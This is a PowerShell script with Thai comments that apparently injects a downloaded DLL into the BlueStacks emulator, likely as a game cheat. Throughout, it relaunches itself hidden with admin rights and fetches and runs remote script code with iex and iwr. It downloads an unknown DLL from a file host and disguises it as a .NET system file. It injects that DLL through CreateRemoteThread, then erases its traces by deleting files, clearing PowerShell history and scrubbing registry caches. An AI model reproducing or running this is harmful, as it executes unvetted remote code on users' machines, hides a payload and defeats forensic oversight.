# 1. ขอสิทธิ์ Administrator (จำเป็นมากสำหรับการ Inject)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# 2. ตั้งค่าไฟล์และการพรางตัว
$url = "https://files.catbox.moe/0ukxya.dll" # ลิงก์ไฟล์ DLL ของคุณ
$fakeName = "mscories.dll" # ปลอมชื่อให้เหมือนไฟล์ระบบ .NET
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
$dllPath = Join-Path $workDir $fakeName
$targetProcess = "HD-Player" # ชื่อโปรเซส BlueStacks โดยไม่ต้องมี .exe

# 3. เตรียมที่เก็บไฟล์
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
attrib +h +s $workDir

# 4. ดาวน์โหลด DLL
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing

# 5. ฟังก์ชันสำหรับ Inject DLL เข้าไปใน BlueStacks (C# Method)
$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    }
}
"@

# 6. เริ่มการรัน BlueStacks และ Inject
if (Test-Path $dllPath) {
    # ตรวจสอบว่า BlueStacks เปิดอยู่ไหม ถ้าไม่เปิดให้เปิดก่อน
    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
    if (!$proc) {
        Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
        Start-Sleep -Seconds 5 # รอให้โปรเซสขึ้น
        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
    }

    if ($proc) {
        # ทำการ Inject DLL เข้าไป
        Add-Type -TypeDefinition $Source
        [Injector]::Inject($proc.Id, $dllPath)
    }
}

# 7. --- ลบร่องรอย (The Ghost Clean) ---
Start-Sleep -Seconds 5
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
Clear-History

# ล้าง Registry MuiCache และ UserAssist เหมือนเดิม
$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
}

# รีสตาร์ท Explorer เพื่อความเนียน
Stop-Process -Name Explorer -Force -ErrorAction SilentlyContinue
Start-Process Explorer -WindowStyle Hidden